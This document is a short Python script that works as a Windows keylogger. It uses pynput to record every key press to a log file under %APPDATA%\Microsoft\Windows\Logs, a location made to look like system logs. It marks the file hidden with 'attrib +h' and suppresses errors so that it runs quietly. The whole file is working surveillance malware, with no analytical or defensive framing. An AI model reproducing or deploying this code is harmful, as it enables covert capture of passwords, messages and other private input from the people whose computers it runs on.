import os
import logging
import subprocess
from pynput import keyboard

def get_safe_hidden_log_path():
    # Use Roaming AppData (safe, hidden location)
    log_dir = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Logs")
    os.makedirs(log_dir, exist_ok=True)
    log_path = os.path.join(log_dir, "keylog.txt")
    return log_path

def hide_file(file_path):
    try:
        # Only hide if not already hidden
        subprocess.run(['attrib', '+h', file_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        pass  # Fail silently

# Step 1: Set safe file path
file_path = get_safe_hidden_log_path()

# Step 2: Create file if it doesn't exist
if not os.path.exists(file_path):
    try:
        with open(file_path, 'w') as f:
            f.write("Keylogger started...\n")
        hide_file(file_path)
    except Exception as e:
        with open("error_log.txt", "w") as err:
            err.write(f"Failed to create/hide log file: {e}\n")
        raise

# Step 3: Configure logging
try:
    logging.basicConfig(filename=file_path, level=logging.DEBUG, format='%(asctime)s: %(message)s')
except Exception as e:
    with open("error_log.txt", "w") as err:
        err.write(f"Failed to configure logging: {e}\n")
    raise

# Step 4: Key press handler
def on_press(key):
    try:
        logging.info(f"Key pressed: {key}")
    except Exception as e:
        with open("error_log.txt", "a") as err:
            err.write(f"Error logging key press: {e}\n")

# Step 5: Start listener
try:
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
except Exception as e:
    with open("error_log.txt", "a") as err:
        err.write(f"Error starting listener: {e}\n")


